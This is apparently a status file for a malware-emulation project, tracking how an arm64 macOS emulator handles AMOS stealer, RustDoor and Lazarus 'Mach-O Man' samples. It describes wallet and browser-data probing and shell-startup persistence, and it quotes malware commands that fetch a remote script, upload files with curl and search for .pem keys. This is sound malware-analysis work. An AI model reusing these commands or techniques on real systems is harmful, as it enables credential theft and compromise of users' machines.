# Sample Status

This file tracks the current state of the local sample corpus as it relates to
emulator behavior.

## `arm64_hello`

- Path: [fixtures/macos/bin/arm64_hello](D:/dev/quiling/qiling/fixtures/macos/bin/arm64_hello)
- Role: smoke-test fixture
- Expected status: should execute successfully
- Current note: used as the primary quick validation sample for `cargo build --bin machina` and basic runtime checks; on Darwin hosts, compat mode proxies the no-dyld arm64 `_puts`, `_printf`, and `_putchar` imports through host libc, proxies `_open`/`_read`/`_write`/`_close` through host libc fd calls, and handles `_dlopen`/`_dlsym` by returning synthetic guest arm64 trampoline stubs instead of raw host pointers. The Intel macOS compat integration test now also compiles a fresh arm64 C program that calls `printf(...)`, `dlsym("printf")` followed by the returned guest trampoline, and `write(1, ...)`, so CI proves observable guest behavior from both the checked-in fixture (`Hello World`) and a newly built binary.

## `2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho`

- Path: [fixtures/macos/bin/2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho](D:/dev/quiling/qiling/fixtures/macos/bin/2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho)
- Family: AMOS stealer
- Architecture: arm64
- Current observed status:
  - probes browser and wallet paths
  - probes browser profile roots such as Chrome, Brave, Edge, and Firefox
  - attempts to open wallet/private data such as Binance, Electrum, Coinomi, and Exodus paths
  - reads synthetic fallback content from guest filesystem policy
  - on Darwin compat hosts, `_sleep`/`_usleep` only proxy to host libc when the synthetic guest scheduler is idle; while AMOS bootstrap has active, pending, or condition-waiting guest threads, the delay hooks stay cooperative so `pthread_cond_wait` can hand off to worker threads and receive the matching `pthread_cond_signal`
  - CI regression guard verifies these milestones from JSONL trace output on Ubuntu
- Important implication:
  - emulator is already past bootstrap/runtime-only execution and into real stealer logic
  - next compatibility work should focus on richer profile traversal and artifact semantics rather than simple `ENOENT` fixes

## `0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho`

- Path: [fixtures/macos/bin/0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho](D:/dev/quiling/qiling/fixtures/macos/bin/0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho)
- Current observed status:
  - retained as a large arm64 analysis target
- Important implication:
  - this sample is both an execution target and a reverse-engineering reference set

## `rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho`

- Path: [fixtures/macos/bin/rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho](D:/dev/quiling/qiling/fixtures/macos/bin/rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho)
- Family: RustDoor
- Architecture: arm64
- Current observed status:
  - parses, maps, and loads Foundation/AppKit/CoreFoundation/Security/libobjc dependencies
  - reaches real runtime/import activity instead of stopping at initial unresolved bindings
  - exercises TLV bootstrap, signal/bootstrap imports, heap growth, `memcmp`, `memmove`, `memcpy`, `malloc`, `realloc`, and `free`
  - now synthetically handles arm64 LSE `ldadd`, `ldapr`, and `cas` runtime atomics that previously consumed the execution budget
  - resolves bootstrap environment lookups such as `getenv("HOME")` from the synthetic guest envp
  - resolves high/tagged literal pointers in libc memory imports, including the path build for `/Users/analyst/.docks`
  - uses chunked synthetic heap mapping so Rust runtime allocation churn no longer exhausts Unicorn memory sections
  - records `posix_spawnp` for `log stream --predicate ... restartInitiated/shutdownInitiated ... --info` and can feed synthetic matching log events into the redirected pipe
  - treats hidden `.inj_*` marker files as absent by default, so RustDoor does not falsely assume Chrome injection already happened
  - progresses through the daemonization path (`fork`, `chdir`, `setsid`, second `fork`) and the grandchild becomes the active daemon
  - tagged-PC FETCH faults now redirect PC to the canonical address, so execution no longer accumulates additional tagged pages for each `bl`/`adrp` from a tagged page
  - the daemon-singleton check on `/tmp/com.apple.lock` now reports `ENOENT`, so the freshly emulated daemon "wins" the lock instead of immediately exiting on the assumption another daemon is already present
  - the LSE atomic hook now also handles `SWP[A][L]` and the rest of the `LDADD`/`LDCLR`/`LDEOR`/`LDSET`/`LDSMAX`/`LDSMIN`/`LDUMAX`/`LDUMIN` family, not just `CAS`/`LDADD`/`LDAPR`. The OnceLock release `SWPAL x8, x8, [x19]` at `0x10018242C` previously hung because Unicorn did not advance PC for it; with the explicit emulator that path now completes (transitioning `0x10026D450`/`0x10026D1D8` from `RUNNING` (2) to `COMPLETE` (3) so the init trampoline returns instead of looping).
  - the synthetic `_waitpid` import now reports `ECHILD` for `WNOHANG` polls when no reapable child is left, mirroring `_wait4`. Without that, the post-OnceLock daemon spun forever in `waitpid(-1, &status, WNOHANG) == 0`.
  - the `_exit` libc symbol is now hooked in addition to the BSD `__exit` syscall wrapper, so the daemon's clean shutdown actually terminates instead of falling through to the generic zero-return stub
  - the `done_addr` cleanup hook now honors `stop_now` even when an `exited_pid` is also reported — the previous `else if` chain meant the runner kept running the dead caller's tail after the daemon exit
  - off-canvas data pages (e.g. `0xA00000000`) are now synthesized for tagged data writes that fall outside the canonical heap/mmap arena, so the post-`waitpid` `WaitStatus` store at `[x19, #8]` (which packs an enum discriminant into bits 32–35) succeeds
  - the parent process (`PID=1`, after the daemon detached) now reaches Chrome-injection probing:
    - `_stat /Applications/Google Chrome.app/Contents/MacOS/Google Chrome` (Chrome detection)
    - `_stat /Users/analyst/.docks/.inj_rc_chr` → `ENOENT` (Chrome rc-injection marker)
    - `_stat /Users/analyst/.docks/.inj_launch_chr` → `ENOENT` (Chrome launch-injection marker)
  - daemon child PID=3 now runs all the way through its persistence path and reaches the **first malware-interesting `posix_spawnp`** from the article:
    - opens `~/.zshrc`, reads it in 32→2048-byte windows, then re-opens it `read_write` and writes injected lines for shell-startup persistence (the literal payload — initially `\n\n`, more after the spawn returns — is dumped to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized>.bin`)
    - opens `~/.docks/cron` and `/tmp/com.apple.lock.<timestamp>` for cron-style and lock persistence
    - `_stat`s the `~/.local` and `~/.zshrc` parents during persistence prep
    - then `posix_spawnp("log", ["log", "stream", "--predicate", "eventMessage contains \"com.apple.restartInitiated\" or eventMessage contains \"com.apple.shutdownInitiated\"", "--info"])` — exactly the shutdown-monitor command from Unit42's Table 1
  - the per-instance `/tmp/com.apple.lock.<timestamp>` marker now reports `ENOENT` like the bare `/tmp/com.apple.lock`, so the daemon doesn't conclude "another instance already installed me" and exit early; combined with `O_CREAT` honoring (see below) it actually creates the lock and proceeds to spawn the log-stream watcher.
  - the open path now honors `O_CREAT` (Darwin `0x200`) for paths the materialization policy normally suppresses. Without that, the malware's "open RDONLY → ENOENT, retry as `O_RDWR|O_CREAT|O_TRUNC`" lock-creation pattern looped back to `ENOENT` on the second open and the daemon panicked instead of moving past the lock check.
  - file writes to synthetic guest fds are now appended to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized_path>.bin`, configurable via `MACHINA_PAYLOAD_DUMP_DIR`, so analysts can inspect the actual payload bytes (e.g. the `~/.zshrc` injection) instead of just a 128-byte preview.
  - the immediate post-daemon blocker observed under the legacy 10M-instruction budget was `instruction_budget_exhausted` deep inside the parent's Rust `OnceLock`/init trampoline at the `cas64` → `blr` pattern around `0x100182424` / `0x10018242C`; with the SWP/`_exit`/`done_addr` fixes that path now completes well within the default profile
  - the worker-thread `brk #0x1` at `0x10000AE00` is no longer reachable: the panic was caused by `_fcntl(kq, F_DUPFD_CLOEXEC, _)` returning `-1` because `duplicate_synthetic_fd` only consults `process_fd_targets` and kqueue fds live in `os.kqueues`. The fcntl hook now detects kqueue fds, clones the kevent registration set into a fresh kqueue fd, and clamps the bogus stack-pointer-shaped min-fd argument that mio leaks through inlined helpers. After this, the worker bootstraps Tokio's macOS event loop the same way real Tokio does: `_kqueue` → 131072, `_fcntl(kq, F_SETFD, _)`, `_fcntl(kq, F_DUPFD_CLOEXEC, _)` → 131073, EVFILT_USER waker registration via `_kevent(ident=0, filter=-10, flags=EV_ADD|EV_CLEAR|EV_RECEIPT)`, `_fcntl(kq, F_DUPFD_CLOEXEC, 1)` → 131074.
  - **current next blocker:** after the worker bootstraps its kqueue + EVFILT_USER waker, the daemon TID=3 reads 320 bytes from the log-stream pipe (the synthetic `restartInitiated` / `shutdownInitiated` log entries fed in by `posix_spawnp`), then both threads block waiting for further async events. The remaining instruction budget is consumed by the parent process spinning in a `OnceLock`/atomic-load loop at `0x100100728` (function `sub_1001006FC`, an `atomic_load_explicit(&qword_10026D408, memory_order_acquire) != 3` re-check). To reach the rest of Unit42's Table-1 commands (`chflags hidden npm`, `chmod +x npm`, `zsh -c zip -r ...`, `zsh -c curl -F file=...`, `zsh -c curl -O https://apple-ads-metric.com/back.sh`, `zsh -c mdfind -name .pem`) we need to drive the C2 command loop — either by handing the daemon a synthetic HTTP response, or by wiring the worker's EVFILT_USER waker so Tokio actually wakes up after the log-stream pipe data is delivered. Neither blocker is a bug in the emulator — they are missing C2 / async-runtime fixtures.
- Important implication:
  - the in-process bootstrap/runtime/daemonization compatibility blockers are resolved and the emulator now reaches the first article-listed `posix_spawnp` command (`log stream --predicate ... restartInitiated/shutdownInitiated --info`)
  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `tests/rustdoor_fast_mode.rs` integration test
  - the next compatibility work for this family is making Tokio's poll loop emit synthetic events for the C2 HTTP requests / log-stream pipe, so the malware progresses past its async wait and into the remaining `posix_spawnp` calls (chflags / chmod / curl / zip / mdfind / reverse-shell)
- Recommended local invocation:
  - `MACHINA_PROFILE=long .\target\debug\machina.exe fixtures\macos\bin\rustdoor\76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho > rustdoor-trace-long.jsonl`

## `machoman/D1yCPUyk.bin.macho`

- Path: [fixtures/macos/bin/machoman/D1yCPUyk.bin.macho](D:/dev/quiling/qiling/fixtures/macos/bin/machoman/D1yCPUyk.bin.macho)
- Family: Lazarus "Mach-O Man" kit, profiler stage (companion of the
  `teamsSDK.bin` stager; downloaded as `D1<random>.bin` and run with
  a `<server_url>` argument to register the host with the C2)
- Architecture: arm64
- Source notes: heavy control-flow obfuscation (every basic block
  ends in an indirect `br xN` through a `movz`/`movk` chain plus
  garbage register ops in between), obfuscated segment names like
  `.<71` / `.hAv` / `.AR1` masking what would normally be
  `__DATA_CONST` / extra `__TEXT` shards, and a duplicate
  chained-fixups table in `__DATA_CONST` mirroring the registered
  chain in the `.<71` segment.
- Current observed status:
  - the binary uses `LC_DYLD_CHAINED_FIXUPS` instead of the legacy
    bind opcodes. The loader walks the chained-fixups blob at load
    time and patches every bind slot (150 in the real chain + 132
    in the `__DATA_CONST` mirror = 282 binds) plus the three
    rebases. Current runs report `Unresolved=0`.
  - the arm64 runner carves a small C++ data-symbol region out of
    the mmap arena for imported libc++ globals (`cerr`, `cin`,
    vtable placeholders, VTT placeholders, and `ctype<char>::id`).
    Chained fixups prefer these data-symbol bindings over function
    stubs so data loads do not interpret stub bytes as objects.
  - `src/macos/arch_arm64/cpp_imports.rs` now covers the libc++
    surface this sample exercises with standard hooks rather than
    sample-local object layouts: string init/copy/destroy,
    `assign`, `compare`, `find`/`rfind`, `append`, `erase`,
    `push_back`, `operator+`, `std::to_string`, stream sentries,
    and `ostream::write`.
  - C++ `operator new` / `operator delete` now use the existing
    synthetic malloc arena. Browser profile vectors therefore get
    real guest addresses (for example `0x52014000`) instead of
    propagating null pointers into `_memmove(dst=0x0, ...)`.
  - With the LR-filtered usage-check bypass and a synthetic URL
    argument, the sample reaches the real profiler pipeline:
    `_gethostname`, repeated `_popen` calls, `TMPDIR`/`HOME`
    lookups, `post_body_` / `post_resp_` temporary filename
    construction, and browser-extension enumeration for Chrome,
    Chrome Beta, Chrome Dev, Chromium, Edge, Brave, Opera,
    Vivaldi, Firefox, and Safari.
  - `_popen` is now hooked as a normal process import and emits
    `popen` JSONL events with the command and mode arguments. The
    profiler's host inventory commands are visible at that OS-call
    boundary, including `uname`, `stat`, `sysctl`, `date`,
    `ifconfig`, and `ps`.
  - Repeated `_sleep(1)` from the same caller is now treated as an
    idle daemon/profiler loop after three hits. The current
    validated run stops cleanly with
    `Detail=idle_sleep_loop(seconds=1, caller=0x100228950, sleeps=3)`
    instead of exhausting the instruction budget.
- **Current next blocker:** the sample's profile collection is now
  past bootstrap and into malware logic, but many command-derived
  values are still empty because `_popen` does not yet synthesize
  command-specific stdout. Browser extension `find ... Extensions`
  commands are visible in the libc++ string-building trace, but the
  OS-level `_popen` argument currently materializes as only the
  trailing ` 2>/dev/null` suffix; the next useful compatibility work
  is fixing the stack-side command handoff after string construction
  plus richer `popen`/FILE output modeling and C2/upload fixtures so
  the generated `post_body_*.txt` / `post_resp_*.txt` flow contains
  realistic host data and server responses.
- **The obfuscated usage check** sits at
  `sub_1002280F4 + 0x34 (= 0x10022812C)`: a `tbz w0, #0,
  0x100228378` that consumes the return value of
  `sub_10022AE68 → sub_10022AE90 → sub_10022AEB4 →
  sub_10022AED4: return sub_100232C28() == 0`. The inner
  `sub_100232C58` is the argc probe IDA gave up on
  (`call analysis failed funcsize=14`). With the LR-filtered bypass
  below, the binary reads argv[1] (`_strlen "http://127.0.0.1:8888"`),
  passes it to `basic_string::compare(0, 7, "http://")`, and proceeds
  past the URL check without forcing later helper calls to stale
  values.
- The arm64 runner now installs a synthetic
  `__mod_init_func` trampoline (mapped R+W+X, passed as
  `RunReport::actual_entry` so `uc_emu_start` actually begins
  there) that calls every static initializer in order before
  tail-jumping to `_main`. The two C++ initializers register
  `___cxa_atexit` handlers via `_dladdr`, then control
  reaches `_main` with `argc/argv/envp` preserved.
- `MACHINA_TRACE_FN_ENTRY=<label>:<hex addr>,...` installs
  no-op code hooks at the given addresses and emits a
  `function-entry` JSONL event whenever execution reaches
  one. Used to pin down which paths the binary actually visits.
- Recommended local invocation:
  - `.\target\debug\machina.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-trace.jsonl`
  - PowerShell validation for the profiler path:
    `$env:MACHINA_TRACE_FORMAT="jsonl"; $env:MACHINA_BYPASS_USAGE_CHECK="0x10022AE68@0x10022812C=1,0;0x10022AE68@0x100225548=0;0x10022AE68@0x100225ADC=0"; $env:MACHINA_ARGV_APPEND="http://127.0.0.1:8888"; .\target\debug\machina.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-bypass.jsonl`
  - `MACHINA_BYPASS_USAGE_CHECK` accepts an optional LR filter
    (`0xADDR@0xLR=...`) and a comma-separated list of per-call return
    values. This keeps the first usage decision patched without
    forcing later calls through the same obfuscated helper to return
    stale values. Each hook hit emits `CallIndex`, `Lr`, `LrFilter`,
    and `ReturnValue` on the existing `bypass-usage-check` JSONL
    event.

## Corpus hygiene

- New samples should be added with a short status note here.
